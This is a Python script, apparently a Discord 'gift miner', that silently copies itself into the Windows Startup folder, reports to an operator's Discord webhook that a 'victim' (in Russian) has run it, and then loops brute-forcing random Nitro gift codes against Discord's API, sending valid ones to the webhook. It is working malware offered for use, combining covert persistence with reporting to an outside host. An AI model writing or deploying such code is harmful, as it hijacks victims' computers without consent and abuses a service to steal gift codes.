from unittest import expectedFailure
from config import setting

URLWEBHOOK = f"{setting.url}"

#         _    __   _   
#  __ _  (_)  / _| | |_ 
# / _` | | | |  _| |  _|
# \__, | |_| |_|    \__|
# |___/                 
#                                    
#  _ __   (_)  _ _    ___   _ _ 
# | '  \  | | | ' \  / -_) | '_|
# |_|_|_| |_| |_||_| \___| |_|  
                                      

#badd

import random
import string
import requests
import os, sys

from random import randint
from requests import get, post
from discord_webhook import DiscordWebhook


def main(URLWEBHOOK):

	Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
	Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
	user_path = os.path.expanduser('~') # Путь к папке пользователя

	if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
		os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
	
	try:
		i = 0
		valid = 0
		novalid = 0

		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила гифт майнер')
		response = webhook.execute()

		while True:

			code = "".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase,k = 16))
							
			nitro = "https://discord.gift/" + code
			r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")

			i += 1

			if r.status_code == 200:
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'||{nitro}||')
				response = webhook.execute()
				valid += 1
			else:
				novalid += 1
				continue
			if i == 10000:
				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'из {i} - {novalid} Invalid | ||{valid}|| Valid')
				response = webhook.execute()
	except:
		print(0/0)

if __name__ == "__main__":
	main(URLWEBHOOK)